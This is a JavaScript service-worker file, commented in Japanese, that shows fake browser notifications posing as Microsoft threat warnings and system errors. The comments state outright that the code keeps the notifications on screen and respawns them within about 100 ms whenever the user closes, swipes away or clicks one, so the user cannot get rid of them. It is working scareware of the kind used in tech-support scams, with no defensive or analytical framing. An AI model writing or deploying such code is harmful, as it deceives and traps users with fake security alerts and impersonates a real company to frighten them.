// 次の1つを出す関数
function spawn(registration) {
    const isIcon = Math.random() > 0.5;
    registration.showNotification(isIcon ? "⚠ Microsoft警告" : "SYSTEM ERROR", {
        body: isIcon ? "脅威を検出しました。直ちに駆除が必要です。" : "システムデータ破損: 0x800410",
        icon: "https://img.icons8.com/color/96/microsoft.png",
        requireInteraction: true, // ユーザーが何かするまで画面に居座る
        renotify: true, // 同じ通知が来ても音と振動を鳴らす
        tag: 'zombie' // 同じタグで上書きし続けることで「消えない」感を出す
    });
}

self.addEventListener('message', (event) => {
    if (event.data === 'start') {
        spawn(self.registration);
    }
});

// ❌マーク、スワイプ、通知センターへの移動など「画面から消えた」ら即補充
self.addEventListener('notificationclose', (event) => {
    event.waitUntil(
        setTimeout(() => {
            spawn(self.registration);
        }, 100)
    );
});

// 通知そのものをクリックした時も逃がさない
self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    spawn(self.registration);
});
